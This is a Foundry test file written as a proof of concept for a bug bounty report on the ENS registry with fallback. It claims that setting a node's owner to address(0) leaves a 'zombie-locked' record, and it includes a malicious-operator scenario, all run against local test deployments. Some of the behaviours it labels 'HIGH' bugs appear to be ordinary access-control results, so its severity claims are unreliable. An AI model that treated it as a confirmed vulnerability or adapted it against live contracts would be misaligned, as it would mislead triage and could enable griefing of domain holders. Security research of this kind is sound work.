// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

import "../contracts/ENSRegistry.sol";
import "../contracts/ENSRegistryWithFallback.sol";

// Minimal Forge cheatcode interface — works with any Solidity version
interface Vm {
    function prank(address sender) external;
    function startPrank(address sender) external;
    function stopPrank() external;
    function expectRevert() external;
}

/// @notice Foundry PoC for Immunefi High submission:
///         ENSRegistryWithFallback._setOwner zombie-lock
///
/// Run: forge test --match-contract ZombieLockTest -vv
///
/// All 4 tests should PASS — each passing test confirms the bug is present.
contract ZombieLockTest {
    Vm internal constant vm = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12d);

    ENSRegistry             internal old;
    ENSRegistryWithFallback internal reg;

    // Deterministic addresses for readability
    address internal constant ALICE    = address(0x1111111111111111111111111111111111111111);
    address internal constant OPERATOR = address(0x2222222222222222222222222222222222222222);
    address internal constant BOB      = address(0x3333333333333333333333333333333333333333);
    address internal constant RESOLVER = address(0x4444444444444444444444444444444444444444);

    bytes32 internal constant ZERO_HASH = bytes32(0);

    bytes32 internal ethNode;
    bytes32 internal aliceNode;
    bytes32 internal bobNode;

    function setUp() public {
        old = new ENSRegistry();
        reg = new ENSRegistryWithFallback(ENS(address(old)));

        // Compute namehashes the same way eth-ens-namehash does:
        //   namehash(label, parent) = keccak256(parent ++ keccak256(label))
        ethNode   = keccak256(abi.encodePacked(ZERO_HASH, keccak256(abi.encodePacked("eth"))));
        aliceNode = keccak256(abi.encodePacked(ethNode,   keccak256(abi.encodePacked("alice"))));
        bobNode   = keccak256(abi.encodePacked(ethNode,   keccak256(abi.encodePacked("bob"))));

        // address(this) = root owner (ENSRegistry constructor: records[0].owner = msg.sender)
        reg.setSubnodeOwner(ZERO_HASH, keccak256(abi.encodePacked("eth")),   ALICE);

        vm.startPrank(ALICE);
        reg.setSubnodeOwner(ethNode, keccak256(abi.encodePacked("alice")), ALICE);
        vm.stopPrank();
    }

    // ── HIGH-1a: owner sets owner=address(0) → zombie lock, subdomain management lost ──

    function test_HIGH1_ZombieLockSubdomainManagementDestroyed() public {
        require(reg.owner(aliceNode) == ALICE, "setup: alice must own aliceNode");

        // Alice retires her domain — documented, standard ENS operation
        vm.startPrank(ALICE);
        reg.setOwner(aliceNode, address(0));
        vm.stopPrank();

        // BUG: owner() returns address(0) — node appears unowned/burned
        require(
            reg.owner(aliceNode) == address(0),
            "HIGH-1: owner() must return address(0)"
        );

        // BUG: recordExists() returns true — node is NOT deleted, it is zombie-locked
        require(
            reg.recordExists(aliceNode),
            "HIGH-1: recordExists() must return true (zombie state, not actual deletion)"
        );

        // IMPACT: Alice is permanently locked out — setSubnodeOwner reverts forever
        vm.startPrank(ALICE);
        vm.expectRevert();
        reg.setSubnodeOwner(aliceNode, keccak256(abi.encodePacked("sub")), ALICE);
        vm.stopPrank();
    }

    // ── HIGH-1b: owner cannot reclaim domain after zombie lock ───────────────

    function test_HIGH1_OwnerCannotReclaimAfterZombie() public {
        vm.startPrank(ALICE);
        reg.setOwner(aliceNode, address(0));
        vm.stopPrank();

        // Alice cannot restore ownership — setOwner also permanently reverts
        vm.startPrank(ALICE);
        vm.expectRevert();
        reg.setOwner(aliceNode, ALICE);
        vm.stopPrank();
    }

    // ── HIGH-2: Malicious operator permanently destroys victim's domain ───────

    function test_HIGH2_MaliciousOperatorZombieLocks() public {
        // Alice grants OPERATOR access — normal practice (marketplaces, ENS manager apps)
        vm.startPrank(ALICE);
        reg.setApprovalForAll(OPERATOR, true);
        vm.stopPrank();

        // Operator destroys alice.eth with a single call — no victim action needed
        vm.startPrank(OPERATOR);
        reg.setOwner(aliceNode, address(0));
        vm.stopPrank();

        require(reg.owner(aliceNode) == address(0), "HIGH-2: appears unowned");
        require(reg.recordExists(aliceNode),        "HIGH-2: zombie confirmed");

        // IMPACT: Alice (victim, did nothing wrong) cannot recover
        vm.startPrank(ALICE);
        vm.expectRevert();
        reg.setOwner(aliceNode, ALICE);
        vm.stopPrank();
    }

    // ── HIGH-3: Zombie lock permanently silences old-registry fallback ────────

    function test_HIGH3_FallbackPermanentlySilenced() public {
        // bob.eth exists only in the OLD registry with a configured resolver
        old.setSubnodeOwner(ZERO_HASH, keccak256(abi.encodePacked("eth")), address(this));
        old.setSubnodeOwner(ethNode,   keccak256(abi.encodePacked("bob")), BOB);

        vm.startPrank(BOB);
        old.setResolver(bobNode, RESOLVER);
        vm.stopPrank();

        // Before zombie: new registry falls back to old registry correctly
        require(reg.owner(bobNode)    == BOB,      "HIGH-3 setup: owner fallback must work");
        require(reg.resolver(bobNode) == RESOLVER, "HIGH-3 setup: resolver fallback must work");

        // eth TLD owner zombie-locks bob.eth in new registry
        vm.startPrank(ALICE);
        reg.setSubnodeOwner(ethNode, keccak256(abi.encodePacked("bob")), address(0));
        vm.stopPrank();

        // IMPACT: old-registry fallback permanently silenced — data invisible forever
        require(
            reg.owner(bobNode) == address(0),
            "HIGH-3 BUG: owner() returns 0 instead of BOB (fallback silenced)"
        );
        require(
            reg.resolver(bobNode) == address(0),
            "HIGH-3 BUG: resolver() returns 0 instead of RESOLVER (fallback silenced)"
        );
    }
}
